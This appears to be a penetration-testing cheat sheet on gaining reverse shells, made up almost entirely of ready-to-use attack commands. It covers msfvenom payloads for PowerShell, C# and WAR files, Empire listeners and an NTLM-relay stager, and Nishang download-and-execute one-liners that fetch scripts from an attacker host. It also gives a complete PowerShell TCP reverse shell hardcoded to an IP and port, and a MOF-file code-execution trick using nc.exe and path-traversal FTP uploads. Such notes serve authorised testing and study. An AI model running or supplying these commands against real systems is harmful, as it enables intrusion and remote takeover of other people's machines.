# Shells

**Powershell**

* `msfvenom --payload cmd/windows/reverse_powershell LHOST=<IP> LPORT=<PORT>`
  * Easy-P: Powershell helper tool, can be used to encode PowerShell script, but you have to encode only the PowerShell source code, without the command `powershell.exe` and its options.
* With Empire
  * To get a listener, from `listeners` menu, `uselistener http` ; `set Name <TARGET>` ; `set Port <PORT>` ; `execute`
  * Generate a oneliner payload linked to the listener from the listeners menu `launcher powershell <TARGET>` ; execute it on your target.
  * Generate a batch file linked to the listener from the main menu `usestager windows/launcher_bat` ; `set Listener http` ; `execute`
    * Use `sudo smbrelayx.py -h <IP> -e ./launcher.bat` to run it during an NTLM-relay attack
* Easy-P can also generate Powershell reverse shell.
* Nishang
  * Copy `Invoke-PowerShellTcp.ps1` locally : [https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
  * Add `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>` at the bottom of the file
  * Download & execute : `powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')`
    * x64 path : `C:\Windows\SysNative\WindowsPowershell\v1.0\`
      * Sysnative is a virtual folder that will help you access 64-bit tools from 32-bit code
* `echo IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>.ps1') | powershell -noprofile -`
* `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.117.100',9998);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

**C#**

* `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`

**WAR**

* For Windows : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war > rs.war`
  * `jar tvf archive.war`
* For Linux : `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war > rs.war`
  * `jar tvf archive.war`

**MOF**

* For this to work the **OS must be XP or lower**.
  * These are useful in the event of an **arbitrary read/write on the file system as a SYSTEM User**.
  * A **MOF file written to %SystemRoot%\System32\wbem\mof\\**, will be **compiled automatically by the OS**, and **allows arbitrary code execution**
  * To check for compilation success/failure, look within
    * `%SystemRoot%\System32\wbem\mof\good\`
    * `%SystemRoot%\System32\wbem\mof\bad\`
* [mofpwn.py](https://gist.githubusercontent.com/deltaclock/5d5c87c790ca174ed08a6f208bec09fa/raw/acc67f0cf3170a7b52269e0fe25bcc5bc684c258/mofpwn.py)
*   Use mofpwn.py to generate the right MOF file : `python mofpwn.py`

    ```
    Enter the name of the mof: initial.MOF
    Enter the name of your exe payload: nc.exe -e cmd <IP> <PORT>
    Upload the files to these locations..
    Windows\System32\nc.exe -e cmd <IP> <PORT>
    Windows\System32\Wbem\mof\initial.MOF
    ```
* Upload nc.exe for Windows on System32 (car dans `$PATH`) : `ftp> put nc.exe ../../../../WINDOWS/System32/nc.exe`
* Upload the MOF file on WINDOWS/System32/wbem/mof/ : `ftp> put initial.MOF ../../../../WINDOWS/System32/wbem/mof/initial.MOF`
* The MOF file in intantanly executed and we got a shell : `nc -nlvp <PORT>`
